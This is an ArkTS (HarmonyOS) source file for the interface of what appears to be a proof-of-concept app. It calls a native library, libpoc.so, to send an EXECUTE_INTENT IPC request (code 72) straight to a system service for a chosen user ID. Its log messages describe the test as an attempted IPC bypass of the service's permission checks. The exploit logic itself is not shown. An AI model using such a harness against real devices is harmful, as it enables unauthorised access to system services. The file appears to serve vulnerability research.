import poc from 'libpoc.so';

@Entry
@Component
struct Index {
  @State userId: string = '100';
  @State result: string = '(no call yet)';
  @State log: string = 'Open hilog with tag IpcPoc to see native-side trace.';

  build() {
    Column({ space: 16 }) {
      Text('IPC PoC — direct ExecuteIntent')
        .fontSize(20)
        .margin({ top: 32 })

      Row({ space: 8 }) {
        Text('target userId:')
          .fontSize(14)
        TextInput({ text: this.userId })
          .width(120)
          .type(InputType.Number)
          .onChange((v: string) => { this.userId = v; })
      }

      Button('Call EXECUTE_INTENT (code=72)')
        .width('80%')
        .onClick(() => {
          const uid: number = parseInt(this.userId || '0', 10);
          let ret = -9999;
          try {
            ret = poc.directExecuteIntent(uid);
          } catch (e) {
            this.result = `JS exception: ${e}`;
            this.log = 'NAPI throw — check that libpoc.so was packaged into the HAP.';
            return;
          }
          this.result = `service returned: ${ret}`;
          if (ret === 0) {
            this.log = 'Service accepted — ExecuteIntent reached and processed.';
          } else if (ret < 0) {
            this.log = 'Local-side failure (samgr lookup or SendRequest error). See hilog.';
          } else {
            this.log = 'Service rejected (CHECK_PERMISSION_FAILED / similar). ' +
                       'This means the server-side guard caught us — the IPC bypass itself worked.';
          }
        })

      Text(this.result)
        .fontSize(16)
        .fontColor(Color.Blue)

      Text(this.log)
        .fontSize(12)
        .fontColor(Color.Gray)
        .padding(8)
        .backgroundColor('#F5F5F5')
        .borderRadius(8)
    }
    .width('100%')
    .height('100%')
    .alignItems(HorizontalAlign.Center)
  }
}
